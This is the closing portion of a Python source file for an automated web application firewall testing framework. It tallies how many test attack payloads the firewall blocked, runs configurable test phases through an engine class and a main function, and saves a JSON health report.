    hdr("PHASE RESULTS SUMMARY")
    for p in phase_results:
        print(f"  {p.summary_line()}")

    # Attack results breakdown — now shows BLOCKED / REDIRECTED / DROPPED / PASSED_THROUGH*
    if attack_results:
        total_atk  = len(attack_results)
        blocked    = sum(1 for a in attack_results if a["blocked"])
        redirected = sum(1 for a in attack_results if a["result"] == "REDIRECTED")
        dropped    = sum(1 for a in attack_results if a["result"] == "DROPPED")
        reconciled = sum(1 for a in attack_results if a.get("reconciled", False))
        missed     = sum(1 for a in attack_results if a["result"] == "PASSED_THROUGH")
        det_rate   = (blocked / total_atk * 100) if total_atk else 0
        det_color  = C.PASS if det_rate >= 80 else (C.WARN if det_rate >= 60 else C.FAIL)

        print(f"""
  {C.BOLD}Attack Suite Results:{C.R}
    Total payloads    : {total_atk}
    {C.PASS}Blocked (403)     : {blocked - redirected - dropped}{C.R}
    {C.PASS}Redirected (WAF)  : {redirected}{C.R}
    {C.PASS}Dropped (conn)    : {dropped}{C.R}
    {C.WARN}Needs review (*)  : {reconciled}{C.R}
    {C.FAIL}Passed through    : {missed}{C.R}
    {det_color}Detection Rate    : {det_rate:.1f}% ({blocked}/{total_atk}){C.R}""")

        if missed > 0:
            print(f"\n{C.FAIL}{C.BOLD}  Missed Attacks (report as bugs if WAF is in MITIGATION):{C.R}")
            for ar in attack_results:
                if ar["result"] == "PASSED_THROUGH":
                    print(f"  {C.FAIL}  ❌ [{ar['id']}] {ar['category']} — {ar['desc']}")
                    print(f"       Payload: {ar['payload']}  |  Status: {ar['status']}{C.R}")

    print(f"\n  {score_color}{C.BOLD}Overall WAF Health Score: {score:.1f}% — {verdict}{C.R}")

    # Findings
    all_findings = [f for p in phase_results for f in p.findings]
    if all_findings:
        hdr("FINDINGS & RECOMMENDATIONS")
        critical = [f for f in all_findings if "[CRITICAL]" in f or "[MISSED]" in f]
        warnings = [f for f in all_findings if "[WARN]" in f]

        if critical:
            print(f"\n{C.FAIL}{C.BOLD}  CRITICAL — Fix before production:{C.R}")
            for f in critical:
                print(f"  {C.FAIL}  • {f.replace('[CRITICAL] ','').replace('[MISSED] ','')}{C.R}")
        if warnings:
            print(f"\n{C.WARN}{C.BOLD}  WARNINGS — Should be addressed:{C.R}")
            for f in warnings:
                print(f"  {C.WARN}  • {f.replace('[WARN] ','')}{C.R}")
    else:
        r_dummy = PhaseResult("dummy")
        log("PASS", "No findings — WAF is well configured!")

    # Save JSON report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_dir = Path(__file__).resolve().parent / "reports"
    report_dir.mkdir(parents=True, exist_ok=True)
    fn = report_dir / (report_name or f"waf_report_v4_{ts}.json")
    # Build phases as a mapping keyed by phase number for easier frontend consumption
    phases_map = {}
    for idx, p in enumerate(phase_results, start=1):
        key = str(getattr(p, 'phase', None) or idx)
        phases_map[key] = {
            "phase": int(key),
            "name": p.name,
            "status": p.status,
            "passed": p.passed,
            "failed": p.failed,
            "skipped": p.skipped,
            "findings": p.findings,
            "checks": getattr(p, 'checks', []),
        }

    report_data = {
        "version":         "4.0",
        "generated_at":    datetime.now().isoformat(),
        "setup_type":      SETUP_TYPE,
        "stack_id":        CONFIG["stack_id"],
        "mgmt_ip":         CONFIG["mgmt_ip"],
        "miti_ip":         CONFIG["miti_ip"],
        "target_listener": CONFIG["target_listener"],
        "health_score":    round(score, 1),
        "verdict":         verdict,
        "phases":          phases_map,
        "attack_results":  attack_results,
        "incidents":       next((p.incidents for p in phase_results if getattr(p, "incidents", None)), []),
        "all_findings":    all_findings,
    }
    with open(fn, "w", encoding="utf-8") as f:
        json.dump(report_data, f, indent=2)
    print(f"\n{C.INFO}  Full JSON report saved → {fn}{C.R}\n")
    emit_event("report_ready", path=str(fn), health_score=round(score, 1), verdict=verdict)
    return report_data


class WAFEngine:
    def __init__(self, config=None, event_queue=None, phases=None, attack_delay=None):
        self.config = config or {}
        self.event_queue = event_queue
        self.phases = phases or {}
        self.attack_delay = attack_delay

    def _apply_runtime_settings(self):
        global SETUP_TYPE, CONFIG, RUN_PHASES, ATTACK_DELAY, EVENT_QUEUE, CURRENT_PHASE
        cfg = self.config or {}
        setup_type = cfg.get("setup_type", SETUP_TYPE)
        if setup_type == "cluster":
            base = {
                "mgmt_ip": cfg.get("mgmt_ip", CLUSTER["mgmt_ip"]),
                "mgmt_port": cfg.get("mgmt_port", CLUSTER["mgmt_port"]),
                "miti_ip": cfg.get("miti_ip", CLUSTER.get("miti_ip", CLUSTER["mgmt_ip"])),
                "api_token": cfg.get("api_token", CLUSTER["api_token"]),
                "stack_id": cfg.get("stack_id", CLUSTER["stack_id"]),
                "target_listener": cfg.get("target_listener", CLUSTER["target_listener"]),
                "use_https_traffic": cfg.get("use_https_traffic", CLUSTER["use_https_traffic"]),
            }
        else:
            base = {
                "mgmt_ip": cfg.get("mgmt_ip", STANDALONE["mgmt_ip"]),
                "mgmt_port": cfg.get("mgmt_port", STANDALONE["mgmt_port"]),
                "miti_ip": cfg.get("miti_ip", STANDALONE.get("miti_ip", STANDALONE["mgmt_ip"])),
                "api_token": cfg.get("api_token", STANDALONE["api_token"]),
                "stack_id": cfg.get("stack_id", STANDALONE["stack_id"]),
                "target_listener": cfg.get("target_listener", STANDALONE["target_listener"]),
                "use_https_traffic": cfg.get("use_https_traffic", STANDALONE["use_https_traffic"]),
            }

        SETUP_TYPE = setup_type
        CONFIG = {
            "setup_type": setup_type,
            "mgmt_host": f"https://{base['mgmt_ip']}:{base['mgmt_port']}",
            "mgmt_ip": base["mgmt_ip"],
            "mgmt_port": base["mgmt_port"],
            "miti_ip": base["miti_ip"],
            "api_token": base["api_token"],
            "stack_id": base["stack_id"],
            "target_listener": base["target_listener"],
            "use_https_traffic": base["use_https_traffic"],
        }
        RUN_PHASES = {
            "phase1_preflight": self.phases.get("phase1_preflight", False),
            "phase2_config": self.phases.get("phase2_config", False),
            "phase3_rules": self.phases.get("phase3_rules", False),
            "phase4_attacks": self.phases.get("phase4_attacks", False),
            "phase5_features": self.phases.get("phase5_features", False),
            "phase6_incidents": self.phases.get("phase6_incidents", False),
            "phase7_report": self.phases.get("phase7_report", False),
        }
        ATTACK_DELAY = self.attack_delay if self.attack_delay is not None else ATTACK_DELAY
        EVENT_QUEUE = self.event_queue
        CURRENT_PHASE = None

    def run(self):
        self._apply_runtime_settings()
        emit_event("test_started", profile=self.config.get("profile_name"), setup_type=SETUP_TYPE)

        if "YOUR_TOKEN_HERE" in CONFIG["api_token"]:
            emit_event("error", message="API token is not configured")
            return None

        api = HaltdosAPI()
        phase_results = []
        attack_results = []
        info = None
        raw_listener = None

        if RUN_PHASES["phase1_preflight"]:
            emit_event("phase_start", phase=1, name="Phase 1 — Pre-flight")
            p1, info, all_data = phase1_preflight(api)
            p1.phase = 1
            phase_results.append(p1)
            emit_event("phase_done", phase=1, name=p1.name, status=p1.status, passed=p1.passed, failed=p1.failed, skipped=p1.skipped, findings=p1.findings)
            if info is None:
                emit_event("error", message="Phase 1 critical failure — cannot continue without listener info")
                return None
            raw_listener = api.find_listener(all_data, CONFIG["target_listener"])

        if RUN_PHASES["phase2_config"] and info and raw_listener:
            emit_event("phase_start", phase=2, name="Phase 2 — Config Validation")
            p2 = phase2_config(info, raw_listener)
            p2.phase = 2
            phase_results.append(p2)
            emit_event("phase_done", phase=2, name=p2.name, status=p2.status, passed=p2.passed, failed=p2.failed, skipped=p2.skipped, findings=p2.findings)

        if RUN_PHASES["phase3_rules"] and info and raw_listener:
            emit_event("phase_start", phase=3, name="Phase 3 — Rules Validation")
            p3 = phase3_rules(info, raw_listener)
            p3.phase = 3
            phase_results.append(p3)
            emit_event("phase_done", phase=3, name=p3.name, status=p3.status, passed=p3.passed, failed=p3.failed, skipped=p3.skipped, findings=p3.findings)

        if RUN_PHASES["phase4_attacks"]:
            emit_event("phase_start", phase=4, name="Phase 4 — Attack Suite")
            p4, attack_results = phase4_attacks(info)
            p4.phase = 4
            phase_results.append(p4)
            emit_event("phase_done", phase=4, name=p4.name, status=p4.status, passed=p4.passed, failed=p4.failed, skipped=p4.skipped, findings=p4.findings)

        if RUN_PHASES["phase5_features"]:
            emit_event("phase_start", phase=5, name="Phase 5 — Feature Tests")
            p5 = phase5_features(info)
            p5.phase = 5
            phase_results.append(p5)
            emit_event("phase_done", phase=5, name=p5.name, status=p5.status, passed=p5.passed, failed=p5.failed, skipped=p5.skipped, findings=p5.findings)

        if RUN_PHASES["phase6_incidents"] and info:
            emit_event("phase_start", phase=6, name="Phase 6 — Incident Verify")
            p6 = phase6_incidents(api, info, attack_results)
            p6.phase = 6
            phase_results.append(p6)
            emit_event("phase_done", phase=6, name=p6.name, status=p6.status, passed=p6.passed, failed=p6.failed, skipped=p6.skipped, findings=p6.findings)

        if RUN_PHASES["phase7_report"]:
            emit_event("phase_start", phase=7, name="Phase 7 — Report")
            report = phase7_report(phase_results, attack_results, info, report_name=self.config.get("report_name"))
            emit_event("phase_done", phase=7, name="Phase 7 — Report", status="PASSED", passed=1, failed=0, skipped=0, findings=[])

        emit_event("test_complete", report=report if 'report' in locals() else None)
        return report if 'report' in locals() else None


# ════════════════════════════════════════════════════════════════════════════
#  MAIN  — orchestrates all phases
# ════════════════════════════════════════════════════════════════════════════
def main():
    hdr("HALTDOS WAF — COMPLETE AUTOMATED TESTING FRAMEWORK v4.0", char="█")
    log("INFO", f"Setup type   : {SETUP_TYPE.upper()}")
    log("INFO", f"Management   : {CONFIG['mgmt_host']}")
    log("INFO", f"Traffic IP   : {CONFIG['miti_ip']}")
    log("INFO", f"Stack ID     : {CONFIG['stack_id']}")
    log("INFO", f"Listener     : {CONFIG['target_listener']}")
    log("INFO", f"Attack delay : {ATTACK_DELAY}s per payload")

    if "YOUR_TOKEN_HERE" in CONFIG["api_token"]:
        log("FAIL", "Set your API token in the CLUSTER or STANDALONE config block first!")
        sys.exit(1)

    api            = HaltdosAPI()
    phase_results  = []
    attack_results = []
    info           = None
    raw_listener   = None

    # ── Phase 1 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase1_preflight"]:
        p1, info, all_data = phase1_preflight(api)
        p1.phase = 1
        phase_results.append(p1)
        if info is None:
            log("FAIL", "Phase 1 critical failure — cannot continue without listener info")
            phase7_report(phase_results, [], None)
            sys.exit(1)
        raw_listener = api.find_listener(all_data, CONFIG["target_listener"])

    # ── Phase 2 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase2_config"] and info and raw_listener:
        p2 = phase2_config(info, raw_listener)
        p2.phase = 2
        phase_results.append(p2)
    elif RUN_PHASES["phase2_config"]:
        log("SKIP", "Phase 2 skipped — no listener data available")

    # ── Phase 3 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase3_rules"] and info and raw_listener:
        p3 = phase3_rules(info, raw_listener)
        p3.phase = 3
        phase_results.append(p3)
    elif RUN_PHASES["phase3_rules"]:
        log("SKIP", "Phase 3 skipped — no listener data available")

    # ── Phase 4 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase4_attacks"] and info:
        if info.mode != "MITIGATION":
            log("WARN", f"WAF profile mode is '{info.mode}' — attacks will be logged only, not blocked")
            log("WARN", "Continue with attack phase anyway? (y/n): ")
            if input().strip().lower() != "y":
                log("SKIP", "Attack phase skipped by user")
            else:
                p4, attack_results = phase4_attacks(info)
                p4.phase = 4
                phase_results.append(p4)
        else:
            p4, attack_results = phase4_attacks(info)
            p4.phase = 4
            phase_results.append(p4)

    # ── Phase 5 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase5_features"] and info:
        p5 = phase5_features(info)
        p5.phase = 5
        phase_results.append(p5)

    # ── Phase 6 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase6_incidents"] and info:
        log("INFO", "Waiting 5s for incidents to be written to the API...")
        time.sleep(5)
        p6 = phase6_incidents(api, info, attack_results)
        p6.phase = 6
        phase_results.append(p6)

    # ── Phase 7 ──────────────────────────────────────────────────────────────
    if RUN_PHASES["phase7_report"]:
        phase7_report(phase_results, attack_results, info)

    hdr("TESTING COMPLETE")
    if attack_results:
        total   = len(attack_results)
        blocked = sum(1 for a in attack_results if a["blocked"])
        pct     = (blocked / total * 100) if total else 0
        color   = C.PASS if pct >= 80 else (C.WARN if pct >= 60 else C.FAIL)
        print(f"  {color}Detection Rate: {pct:.1f}% ({blocked}/{total} attacks blocked){C.R}\n")


if __name__ == "__main__":
    main()